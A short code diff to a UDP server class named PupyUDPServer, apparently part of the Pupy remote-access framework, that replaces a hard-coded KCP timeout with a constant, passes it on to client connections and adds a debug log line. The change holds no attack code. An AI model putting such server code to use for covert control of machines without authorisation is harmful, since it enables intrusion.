@@ -222,6 +222,8 @@ class PupyUDPServer(object):
         self.sock = None
         self.host = kwargs.get('host') or kwargs.get('hostname')
 
+        self.LONG_SLEEP_INTERRUPT_TIMEOUT = 5
+
     @property
     def stream_class(self):
         return self.stream
@@ -268,7 +270,7 @@ class PupyUDPServer(object):
         self.sock.setblocking(0)
         self.dispatcher = self.kcp.KCPDispatcher(
             self.sock.fileno(), 0,
-            timeout=5000
+            timeout=self.LONG_SLEEP_INTERRUPT_TIMEOUT * 1000
         )
 
     def on_close(self, addr):
@@ -298,8 +300,12 @@ class PupyUDPServer(object):
             self.transport,
             self.transport_kwargs,
             client_side=False,
-            close_cb=self.on_close
+            close_cb=self.on_close,
+            lsi=self.LONG_SLEEP_INTERRUPT_TIMEOUT
         )
+
+        logging.debug('Request pings: {}'.format(
+            client.KEEP_ALIVE_REQUIRED or self.ping_interval))
 
         connthread = PupyConnectionThread(
             self.pupy_srv,
